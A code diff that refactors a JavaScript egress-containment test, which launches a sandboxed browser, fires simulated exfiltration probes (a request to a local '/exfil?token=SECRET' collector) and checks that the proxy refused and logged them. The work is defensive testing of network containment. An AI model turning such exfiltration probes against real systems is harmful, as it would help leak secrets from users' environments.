@@ -59,8 +59,15 @@ async function startUdpCollector() {
   return { hits, port: socket.address().port, close: () => socket.close() };
 }
 
-/** Runs inside the page. Never throws: each channel reports its own outcome. */
-async function attackFromPage({ tcpPort, udpPort, host, allowedUrl }) {
+/**
+ * Runs inside the page. Never throws: each channel reports its own outcome.
+ * Exported only so a test can execute it against fake browser globals; the
+ * browser receives its source through page.evaluate exactly as before.
+ *
+ * @param {{ tcpPort: number, udpPort: number, host: string, allowedUrl: string }} input
+ * @returns {Promise<{ outcomes: Record<string, string>, allowedStatus: number }>}
+ */
+export async function attackFromPage({ tcpPort, udpPort, host, allowedUrl }) {
   const target = `http://${host}:${tcpPort}/exfil?token=SECRET`;
   const outcomes = {};
   const attempt = async (name, fn) => {
@@ -154,11 +161,79 @@ async function attackFromPage({ tcpPort, udpPort, host, allowedUrl }) {
 }
 
 /**
+ * Every failure derivable from what the collectors and the page reported.
+ * Order is part of the evidence format: collector, allowlisted origin, probes,
+ * navigation.
+ *
+ * @param {{
+ *   tcpEvents: number,
+ *   udpPackets: number,
+ *   attackResult: { outcomes: Record<string, unknown>, allowedStatus: number },
+ *   navigation: string,
+ * }} input
+ * @returns {string[]}
+ */
+export function collectProofFailures({ tcpEvents, udpPackets, attackResult, navigation }) {
+  const failures = [];
+  if (tcpEvents > 0) failures.push(`collector received TCP traffic (${tcpEvents} events)`);
+  if (udpPackets > 0) failures.push(`collector received UDP traffic (${udpPackets} packets)`);
+  if (attackResult.allowedStatus !== 200) {
+    failures.push(`allowlisted origin was not reachable through the proxy (status ${attackResult.allowedStatus})`);
+  }
+  // Every mandatory probe must have run and ended in a contained outcome; an
+  // unavailable or missing probe is a failure, never a skip.
+  for (const [name, accepted] of Object.entries(EGRESS_PROOF_CHANNELS)) {
+    const outcome = attackResult.outcomes[name];
+    if (typeof outcome !== "string" || !accepted.includes(outcome)) {
+      failures.push(`mandatory probe "${name}" did not end in a contained outcome`);
+    }
+  }
+  for (const name of Object.keys(attackResult.outcomes)) {
+    if (!(name in EGRESS_PROOF_CHANNELS)) failures.push("an unlisted probe ran");
+  }
+  if (!EGRESS_PROOF_NAVIGATION_OUTCOMES.includes(navigation)) {
+    failures.push("top-level navigation to the collector was not refused");
+  }
+  return failures;
+}
+
+/**
+ * Positive control: the proxy itself must have recorded the refusals. Only
+ * fixed reason codes are read back; the host of the probe is never logged.
+ *
+ * @param {(() => Promise<string> | string) | undefined} readProxyLog
+ * @returns {Promise<{ proxyDenials: Record<string, number> | null, failures: string[] }>}
+ */
+export async function assessProxyDenials(readProxyLog) {
+  const failures = [];
+  /** @type {Record<string, number> | null} */
+  let proxyDenials = null;
+  try {
+    if (!readProxyLog) throw new Error("no proxy log");
+    const parsed = parseEgressDenialLog(await readProxyLog());
+    proxyDenials = { ...parsed.denials, unrecognized: parsed.unrecognized };
+  } catch {
+    failures.push("the proxy denial log could not be read");
+  }
+  if (proxyDenials) {
+    if (!(proxyDenials["not-allowlisted-loopback"] >= 1)) {
+      failures.push("the proxy did not record a denial of the loopback collector probe");
+    }
+    if (proxyDenials.unrecognized > 0) {
+      failures.push("the proxy log contained lines outside the fixed vocabulary");
+    }
+  }
+  return { proxyDenials, failures };
+}
+
+/**
  * @param {{
  *   env?: Record<string, string | undefined>,
  *   allowedOrigin?: string,
  *   allowedPath?: string,
  *   readProxyLog?: () => Promise<string> | string,
+ *   launchBrowser?: (options: Record<string, unknown>) => Promise<any>,
+ *   settleMs?: number,
  * }} [options]
  */
 export async function runBrowserEgressProof({
@@ -170,15 +245,20 @@ export async function runBrowserEgressProof({
   readProxyLog = env[PROXY_LOG_ENV]
     ? () => readFile(env[PROXY_LOG_ENV], "utf8")
     : undefined,
+  // Injection points for tests; the defaults are the real Chromium launcher and
+  // the real settle delay, so the CLI behaves exactly as before.
+  launchBrowser = (options) => chromium.launch(options),
+  settleMs = SETTLE_MS,
 } = {}) {
   const launch = browserEgressLaunchOptions({ ...env, BROWSER_EGRESS_REQUIRED: "1" });
   const tcp = await startTcpCollector();
   const udp = await startUdpCollector();
-  const failures = [];
-  let attackResult = { outcomes: {}, allowedStatus: 0 };
-  let navigation = "not-run";
+  /** @type {{ outcomes: Record<string, unknown>, allowedStatus: number }} */
+  let attackResult;
+  /** @type {string} */
+  let navigation;
 
-  const browser = await chromium.launch({ headless: true, ...launch });
+  const browser = await launchBrowser({ headless: true, ...launch });
   try {
     const context = await browser.newContext({ ...EGRESS_CONTEXT_OPTIONS });
     // The page itself is synthesised at the allowlisted origin so it is a secure
@@ -204,52 +284,22 @@ export async function runBrowserEgressProof({
       .goto(`http://${COLLECTOR_HOST}:${tcp.port}/exfil?token=SECRET`, { timeout: 5000 })
       .then((response) => `response:${response?.status() ?? "none"}`)
       .catch(() => "failed");
-    await new Promise((resolve) => setTimeout(resolve, SETTLE_MS));
+    await new Promise((resolve) => setTimeout(resolve, settleMs));
   } finally {
     await browser.close().catch(() => {});
     tcp.close();
     udp.close();
   }
 
-  if (tcp.hits.length > 0) failures.push(`collector received TCP traffic (${tcp.hits.length} events)`);
-  if (udp.hits.length > 0) failures.push(`collector received UDP traffic (${udp.hits.length} packets)`);
-  if (attackResult.allowedStatus !== 200) {
-    failures.push(`allowlisted origin was not reachable through the proxy (status ${attackResult.allowedStatus})`);
-  }
-  // Every mandatory probe must have run and ended in a contained outcome; an
-  // unavailable or missing probe is a failure, never a skip.
-  for (const [name, accepted] of Object.entries(EGRESS_PROOF_CHANNELS)) {
-    const outcome = attackResult.outcomes[name];
-    if (typeof outcome !== "string" || !accepted.includes(outcome)) {
-      failures.push(`mandatory probe "${name}" did not end in a contained outcome`);
-    }
-  }
-  for (const name of Object.keys(attackResult.outcomes)) {
-    if (!(name in EGRESS_PROOF_CHANNELS)) failures.push("an unlisted probe ran");
-  }
-  if (!EGRESS_PROOF_NAVIGATION_OUTCOMES.includes(navigation)) {
-    failures.push("top-level navigation to the collector was not refused");
-  }
-
-  // Positive control: the proxy itself must have recorded the refusals. Only
-  // fixed reason codes are read back; the host of the probe is never logged.
-  /** @type {Record<string, number> | null} */
-  let proxyDenials = null;
-  try {
-    if (!readProxyLog) throw new Error("no proxy log");
-    const parsed = parseEgressDenialLog(await readProxyLog());
-    proxyDenials = { ...parsed.denials, unrecognized: parsed.unrecognized };
-  } catch {
-    failures.push("the proxy denial log could not be read");
-  }
-  if (proxyDenials) {
-    if (!(proxyDenials["not-allowlisted-loopback"] >= 1)) {
-      failures.push("the proxy did not record a denial of the loopback collector probe");
-    }
-    if (proxyDenials.unrecognized > 0) {
-      failures.push("the proxy log contained lines outside the fixed vocabulary");
-    }
-  }
+  const failures = collectProofFailures({
+    tcpEvents: tcp.hits.length,
+    udpPackets: udp.hits.length,
+    attackResult,
+    navigation,
+  });
+  const assessed = await assessProxyDenials(readProxyLog);
+  failures.push(...assessed.failures);
+  const proxyDenials = assessed.proxyDenials;
   return {
     ok: failures.length === 0,
     failures,
@@ -261,21 +311,43 @@ export async function runBrowserEgressProof({
   };
 }
 
-if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
-  if (!process.env[BROWSER_EGRESS_PROXY_ENV]) {
-    process.stderr.write(`${BROWSER_EGRESS_PROXY_ENV} is required.\n`);
-    process.exit(1);
+/**
+ * CLI body used by the trusted workflow. Fails closed on every path.
+ *
+ * @param {{
+ *   env?: Record<string, string | undefined>,
+ *   run?: typeof runBrowserEgressProof,
+ *   stdout?: (text: string) => void,
+ *   stderr?: (text: string) => void,
+ *   exit?: (code: number) => void,
+ * }} [io]
+ */
+export async function runBrowserEgressProofCli({
+  env = process.env,
+  run = runBrowserEgressProof,
+  stdout = (text) => process.stdout.write(text),
+  stderr = (text) => process.stderr.write(text),
+  exit = (code) => process.exit(code),
+} = {}) {
+  if (!env[BROWSER_EGRESS_PROXY_ENV]) {
+    stderr(`${BROWSER_EGRESS_PROXY_ENV} is required.\n`);
+    exit(1);
+    return;
   }
-  runBrowserEgressProof({
-    allowedOrigin: process.env.BROWSER_EGRESS_ALLOWED_ORIGIN || DEFAULT_CANDIDATE_ORIGIN,
-    allowedPath: process.env.BROWSER_EGRESS_ALLOWED_PATH || "/api/health",
-  })
-    .then((result) => {
-      process.stdout.write(JSON.stringify(result, null, 2) + "\n");
-      process.exit(result.ok ? 0 : 1);
-    })
-    .catch((error) => {
-      process.stderr.write(`Egress proof could not run: ${error instanceof Error ? error.message : "unknown"}\n`);
-      process.exit(1);
+  try {
+    const result = await run({
+      env,
+      allowedOrigin: env.BROWSER_EGRESS_ALLOWED_ORIGIN || DEFAULT_CANDIDATE_ORIGIN,
+      allowedPath: env.BROWSER_EGRESS_ALLOWED_PATH || "/api/health",
     });
+    stdout(JSON.stringify(result, null, 2) + "\n");
+    exit(result.ok ? 0 : 1);
+  } catch (error) {
+    stderr(`Egress proof could not run: ${error instanceof Error ? error.message : "unknown"}\n`);
+    exit(1);
+  }
+}
+
+if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {
+  void runBrowserEgressProofCli();
 }
